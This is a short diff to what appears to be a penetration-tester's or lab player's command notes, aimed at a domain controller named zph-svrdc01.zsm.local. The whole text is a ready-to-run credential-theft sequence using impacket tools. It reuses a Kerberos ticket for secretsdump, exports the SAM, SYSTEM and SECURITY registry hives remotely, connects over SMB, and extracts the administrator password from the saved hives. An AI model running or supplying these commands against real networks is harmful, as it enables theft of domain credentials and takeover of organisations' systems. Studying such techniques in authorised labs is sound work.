@@ -35,3 +35,12 @@ export KRB5CCNAME=cifs.ccache
 
 # secretsdump via kerberos authentication
 impacket-secretsdump -debug zph-svrdc01.zsm.local -k -no-pass
+
+# Alternative using impacket-reg, do a SAMDUMP
+impacket-reg zph-svrdc01.zsm.local -k save -keyName 'HKLM\SAM' -o 'c:\';impacket-reg zph-svrdc01.zsm.local -k save -keyName 'HKLM\SYSTEM' -o 'c:\';impacket-reg zph-svrdc01.zsm.local -k save -keyName 'HKLM\SECURITY' -o 'c:\'
+
+# Access DC
+impacket-smbclient zph-svrdc01.zsm.local -k -no-pass
+
+# Get admin password
+impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
